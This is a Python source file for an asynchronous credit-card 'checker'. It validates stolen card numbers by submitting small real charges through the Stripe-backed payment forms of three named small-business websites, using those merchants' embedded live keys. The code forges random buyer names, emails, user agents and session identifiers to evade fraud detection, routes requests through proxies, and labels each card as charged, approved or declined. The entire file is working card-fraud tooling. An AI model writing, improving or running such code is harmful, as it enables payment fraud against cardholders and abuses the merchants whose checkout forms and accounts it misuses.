"""
stripecheck.py — Async Multi-Site Stripe Checking Engine

Converted from god-main gatet*.py (blocking requests) to async aiohttp.
Randomly picks one of 3 Stripe-backed sites per check for load balancing.
"""

import aiohttp
import asyncio
import random
import time
import uuid  # FIXED: Added missing import
import string
import re
import logging
from typing import Tuple, Optional, Dict, Any

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION KEYS (from god-main)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SUCCESS_KEYS = ["appreciate", "appreciated", "Payment Success", "payment successful", "payment succesful", "success!", "successful!", "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!"]
CCN_KEYS = ["security code is incorrect", "INCORRECT_CVV", "Your card number is incorrect", "number is incorrect", "incorrect_cvc", "cvc", "invalid cvc"]
DECLINED_KEYS = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "cannot process your order", "Invalid account", "does not match the billing address"]
CVV_KEYS = ["do_not_honor"]
INSUFFICIENT_KEYS = ["Your card has insufficient funds.", "INSUFFICIENT_FUNDS", "insufficient_funds", "Insufficient Funds", "Insufficient", "low funds", "balance"]
EXPIRED_KEYS = ["card has expired", "expired card", "card expired", "expired"]
OTP_KEYS = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "CompletePaymentChallenge", "requires_action", "additional action before completion!", "nextAction", "3d_secure", "authenticate", "client_secret"]
RETRY_KEYS = ["transaction_not_allowed", "does not support this type of purchase", "Too Many Requests", "again in a little bit", "reCaptcha", "exceeding its amount limit", "Failed to perform", "resource limit is reached", "508", "502 bad gateway", "503 service unavailable", "504 gateway time-out", "cloudflare", "temporarily unable to"]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RANDOM DATA GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph",
    "Thomas", "Christopher", "Charles", "Daniel", "Matthew", "Anthony", "Mark",
    "Donald", "Steven", "Andrew", "Paul", "Joshua", "Kenneth", "Kevin", "Brian",
    "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan",
    "Jessica", "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra",
    "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle", "Carol",
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
    "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
    "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson",
    "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen",
]

EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com",
    "icloud.com", "mail.com", "zoho.com", "yandex.com", "aol.com"
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9RT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]


def _random_name() -> str:
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"


def _random_email() -> str:
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    return f"{username}@{random.choice(EMAIL_DOMAINS)}"


def _random_ua() -> str:
    return random.choice(USER_AGENTS)


def _random_guid() -> str:
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFIER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def classify_response(msg: str) -> str:
    """
    Classify a gateway response message.
    Returns: CHARGED | APPROVED | 3DS | CCN | CVV | EXPIRED | DECLINED | ERROR
    """
    low = msg.lower()

    if any(k.lower() in low for k in SUCCESS_KEYS):
        return "CHARGED"

    if any(k.lower() in low for k in INSUFFICIENT_KEYS):
        return "APPROVED"

    if any(k.lower() in low for k in OTP_KEYS):
        return "ERROR"

    if any(k.lower() in low for k in CCN_KEYS):
        return "CCN"

    if any(k.lower() in low for k in RETRY_KEYS):
        return "ERROR"

    if any(k.lower() in low for k in CVV_KEYS):
        return "CVV"

    if any(k.lower() in low for k in EXPIRED_KEYS):
        return "EXPIRED"

    if any(k.lower() in low for k in DECLINED_KEYS):
        return "DECLINED"

    return "DECLINED"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE 1: travellingwell.com.au (gatet.py)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_message(data: Any) -> str:
    """Intelligently extract the human-readable message from WP Stripe / Fluent Forms JSON."""
    msg = ""
    if not isinstance(data, dict):
        msg = str(data)
    else:
        # Check for 3D Secure / SCA required in Fluent Forms
        if data.get('success') is True and isinstance(data.get('data'), dict):
            if 'nextAction' in data['data'] or 'client_secret' in data['data']:
                return "3D Secure Authentication Required (client_secret)"
            # Check for result.message inside data (success case)
            if 'result' in data['data'] and isinstance(data['data']['result'], dict) and 'message' in data['data']['result']:
                msg = data['data']['result']['message']
            elif 'message' in data['data'] and isinstance(data['data']['message'], str):
                msg = data['data']['message']

        if not msg:
            # Check for direct message key
            if 'message' in data and isinstance(data['message'], str) and data['message'].strip():
                msg = data['message']
            # Check for fluentform 'errors'
            elif 'errors' in data:
                err = data['errors']
                if isinstance(err, str):
                    msg = err
                elif isinstance(err, list) and len(err) > 0 and isinstance(err[0], str):
                    msg = err[0]
                else:
                    msg = str(err)
            # Check for wp_full_stripe 'bindingResult' validation errors
            elif 'bindingResult' in data:
                try:
                    errors_list = data['bindingResult']['fieldErrors']['errors']
                    if len(errors_list) > 0 and 'message' in errors_list[0]:
                        msg = errors_list[0]['message']
                except Exception:
                    pass
            elif 'error' in data:
                msg = str(data['error'])
            else:
                msg = str(data)

    # Strip HTML tags
    msg = re.sub(r'<[^>]+>', ' ', msg).strip()
    msg = re.sub(r'\s+', ' ', msg)
            
    # Strip "Stripe Error: " from the message if it exists
    if msg.startswith("Stripe Error: "):
        msg = msg.replace("Stripe Error: ", "", 1)
        
    return msg


async def _check_travellingwell(n, mm, yy, cvc, proxy=None) -> Dict[str, str]:
    """Travellingwell.com.au — Fluent Forms + Stripe ($6.95 ebook)"""
    user_agent = _random_ua()
    random_email_addr = _random_email()
    stripe_key = "pk_live_51SIkqdLknc83KPzcJBUu6tRJ06FLSDeUmBoRiGsJJW97R5RMIeFIOb4sYzUFjAahpd0czNIVCOc3Zs1202aF5HcU00gSnlcWBf"

    guid = _random_guid()
    muid = _random_guid()
    sid = _random_guid()

    timeout = aiohttp.ClientTimeout(total=30)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        # STEP 1: Create Payment Method
        stripe_data = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}'
            f'&guid={guid}&muid={muid}&sid={sid}'
            f'&pasted_fields=number'
            f'&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+card-element'
            f'&referrer=https%3A%2F%2Fwww.travellingwell.com.au'
            f'&time_on_page={random.randint(10000, 60000)}'
            f'&client_attribution_metadata[client_session_id]={_random_guid()}'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
            f'&client_attribution_metadata[merchant_integration_version]=2017'
            f'&client_attribution_metadata[wallet_config_id]={_random_guid()}'
            f'&key={stripe_key}'
        )

        headers1 = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        async with session.post('https://api.stripe.com/v1/payment_methods',
                                headers=headers1, data=stripe_data, proxy=proxy) as resp:
            if resp.status != 200:
                text = await resp.text()
                return {"status": "ERROR", "message": f"Stripe PM error: {text[:100]}", "gateway": "Travellingwell $6.95"}
            pm_data = await resp.json(content_type=None)
            pm_id = pm_data.get('id')
            if not pm_id:
                return {"status": "ERROR", "message": "No PM ID", "gateway": "Travellingwell $6.95"}

        await asyncio.sleep(random.uniform(0.1, 0.3))

        # STEP 2: Submit via Fluent Forms
        cookies = {
            '__stripe_mid': muid,
            '__stripe_sid': sid,
        }
        cookie_str = '; '.join(f'{k}={v}' for k, v in cookies.items())

        wp_data = {
            'data': f'item_3__fluent_sf=&__fluent_form_embded_post_id=15&_fluentform_3_fluentformnonce=a43524378e&_wp_http_referer=%2F&names%5Bfirst_name%5D={random.choice(FIRST_NAMES)}&names%5Blast_name%5D={random.choice(LAST_NAMES)}&email={random_email_addr}&payment_input=Travelling%20Well%20eBook%20-%20EPUB%20(%246.95)&item-quantity=1&payment_method=stripe&__stripe_payment_method_id={pm_id}',
            'action': 'fluentform_submit',
            'form_id': '3',
        }

        headers2 = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.travellingwell.com.au',
            'Referer': 'https://www.travellingwell.com.au/',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': user_agent,
            'Cookie': cookie_str,
        }

        async with session.post('https://www.travellingwell.com.au/wp-admin/admin-ajax.php',
                                headers=headers2, data=wp_data, proxy=proxy) as resp:
            try:
                r2_data = await resp.json(content_type=None)
                message = extract_message(r2_data)
            except Exception:
                message = await resp.text()

    status = classify_response(str(message))
    return {"status": status, "message": str(message)[:200], "gateway": "Travellingwell $6.95"}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE 2: farmingdalephysicaltherapywest.com (gatet1.py)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _check_farmingdale(n, mm, yy, cvc, proxy=None) -> Dict[str, str]:
    """Farmingdale PT West — WP Full Stripe ($0.50)"""
    user_agent = _random_ua()
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    full_name = f"{first} {last}"
    email = _random_email()
    stripe_key = "pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv"
    wallet_config_id = "2cf18455-8d84-460f-9efe-2176e44a40b2"

    guid = _random_guid()
    muid = _random_guid()
    sid = _random_guid()
    client_session_id = _random_guid()

    timeout = aiohttp.ClientTimeout(total=30)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        # STEP 1: Create Payment Method
        stripe_data = (
            f'type=card'
            f'&billing_details[name]={full_name.replace(" ", "+")}'
            f'&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}'
            f'&guid={guid}&muid={muid}&sid={sid}'
            f'&pasted_fields=number'
            f'&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+card-element'
            f'&referrer=https%3A%2F%2Ffarmingdalephysicaltherapywest.com'
            f'&time_on_page={random.randint(10000, 60000)}'
            f'&client_attribution_metadata[client_session_id]={client_session_id}'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
            f'&client_attribution_metadata[merchant_integration_version]=2017'
            f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
            f'&key={stripe_key}'
        )

        headers1 = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        async with session.post('https://api.stripe.com/v1/payment_methods',
                                headers=headers1, data=stripe_data, proxy=proxy) as resp:
            if resp.status != 200:
                text = await resp.text()
                return {"status": "ERROR", "message": f"Stripe PM error: {text[:100]}", "gateway": "Farmingdale $0.50"}
            pm_data = await resp.json(content_type=None)
            pm_id = pm_data.get('id')
            if not pm_id:
                return {"status": "ERROR", "message": "No PM ID", "gateway": "Farmingdale $0.50"}

        await asyncio.sleep(random.uniform(0.1, 0.3))

        # STEP 2: Charge via WP Full Stripe
        wp_data = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'Payment-Form',
            'wpfs-form-get-parameters': '{}',
            'wpfs-custom-amount-unique': '0.50',
            'wpfs-custom-input[]': full_name,
            'wpfs-card-holder-email': email,
            'wpfs-card-holder-name': full_name,
            'wpfs-stripe-payment-method-id': pm_id,
        }

        headers2 = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://farmingdalephysicaltherapywest.com',
            'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': user_agent,
        }

        async with session.post('https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php',
                                headers=headers2, data=wp_data, proxy=proxy) as resp:
            try:
                r2_data = await resp.json(content_type=None)
                message = extract_message(r2_data)
            except Exception:
                message = await resp.text()

    status = classify_response(str(message))
    return {"status": status, "message": str(message)[:200], "gateway": "Farmingdale $0.50"}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE 3: torr.ie (gatet2.py - gatet5.py)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _check_torrie(n, mm, yy, cvc, proxy=None) -> Dict[str, str]:
    """Torr.ie — WP Full Stripe ($0.64)"""
    user_agent = _random_ua()
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    full_name = f"{first} {last}"
    email = _random_email()
    stripe_key = "pk_live_51JVKouAs6DndN9b8mx4e9zfXHN3jWXh6L0V2n3xk59hs90Nqy9RuqM2nqdjQkKPOB5DwBgoe9poeThAhanhLNPi900zHJa87Tz"

    guid = _random_guid()
    muid = _random_guid()
    sid = _random_guid()
    client_session_id = _random_guid()
    charge_amount = "0.64"

    timeout = aiohttp.ClientTimeout(total=30)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        # STEP 1: Create Payment Method
        stripe_data = (
            f'type=card'
            f'&billing_details[name]={full_name.replace(" ", "+")}'
            f'&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}'
            f'&guid={guid}&muid={muid}&sid={sid}'
            f'&pasted_fields=number'
            f'&payment_user_agent=stripe.js%2F922d612e68%3B+stripe-js-v3%2F922d612e68%3B+card-element'
            f'&referrer=https%3A%2F%2Ftorr.ie'
            f'&time_on_page={random.randint(10000, 50000)}'
            f'&client_attribution_metadata[client_session_id]={client_session_id}'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
            f'&client_attribution_metadata[merchant_integration_version]=2017'
            f'&key={stripe_key}'
        )

        headers1 = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        async with session.post('https://api.stripe.com/v1/payment_methods',
                                headers=headers1, data=stripe_data, proxy=proxy) as resp:
            if resp.status != 200:
                text = await resp.text()
                # Check for expired card in Stripe error
                if "expired" in text.lower():
                    return {"status": "EXPIRED", "message": "Card has expired", "gateway": f"Torr.ie ${charge_amount}"}
                return {"status": "ERROR", "message": f"Stripe PM error: {text[:100]}", "gateway": f"Torr.ie ${charge_amount}"}
            pm_data = await resp.json(content_type=None)
            pm_id = pm_data.get('id')
            if not pm_id:
                return {"status": "ERROR", "message": "No PM ID", "gateway": f"Torr.ie ${charge_amount}"}

        await asyncio.sleep(random.uniform(0.1, 0.3))

        # STEP 2: Charge via WP Full Stripe
        random_num = random.randint(10000, 99999)
        random_word = random.choice(["Payment", "Service", "Order", "Item", "Product"])
        random_phone = f"07{random.randint(10000000, 99999999)}"

        wp_data = (
            f'action=wp_full_stripe_inline_payment_charge'
            f'&wpfs-form-name=default'
            f'&wpfs-form-get-parameters=%7B%7D'
            f'&wpfs-custom-amount-unique={charge_amount}'
            f'&wpfs-custom-input%5B%5D={random_num}'
            f'&wpfs-custom-input%5B%5D={random_word}'
            f'&wpfs-custom-input%5B%5D={random_phone}'
            f'&wpfs-card-holder-email={email}'
            f'&wpfs-card-holder-name={full_name.replace(" ", "+")}'
            f'&wpfs-stripe-payment-method-id={pm_id}'
        )

        headers2 = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://torr.ie',
            'Referer': 'https://torr.ie/payments/',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': user_agent,
        }

        async with session.post('https://torr.ie/wp-admin/admin-ajax.php',
                                headers=headers2, data=wp_data, proxy=proxy) as resp:
            try:
                r2_data = await resp.json(content_type=None)
                message = extract_message(r2_data)
            except Exception:
                message = await resp.text()

    status = classify_response(str(message))
    return {"status": status, "message": str(message)[:200], "gateway": f"Torr.ie ${charge_amount}"}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE POOL + PUBLIC API
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_SITE_CHECKERS = [
    _check_travellingwell,   # From gatet.py
    _check_farmingdale,      # From gatet1.py (part 1)
    _check_torrie,           # From gatet1.py (part 2) & gatet2.py
    _check_torrie,           # From gatet3.py
    _check_torrie,           # From gatet4.py
    _check_torrie,           # From gatet5.py
]


async def check_card(card_string: str, proxy: str = None) -> Dict[str, str]:
    """
    Public async entry point.
    Input:  'cc|mm|yy|cvv'
    Proxy:  'http://user:pass@host:port' or None
    Returns: {'status': ..., 'message': ..., 'gateway': ...}
    
    Status values: CHARGED, APPROVED, 3DS, CCN, CVV, EXPIRED, DECLINED, ERROR
    """
    parts = [p.strip() for p in card_string.split('|')]
    if len(parts) < 4:
        return {"status": "ERROR", "message": "Invalid card format", "gateway": "N/A"}

    n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2], parts[3]

    if len(yy) == 4:
        yy = yy[2:]

    # Random site pick
    checker = random.choice(_SITE_CHECKERS)

    try:
        return await checker(n, mm, yy, cvc, proxy=proxy)
    except aiohttp.ClientError as e:
        # Try without proxy on proxy errors
        if proxy:
            try:
                return await checker(n, mm, yy, cvc, proxy=None)
            except Exception as e2:
                return {"status": "ERROR", "message": str(e2)[:100], "gateway": "N/A"}
        return {"status": "ERROR", "message": f"Connection Error: {str(e)[:80]}", "gateway": "N/A"}
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Timeout", "gateway": "N/A"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:100], "gateway": "N/A"}

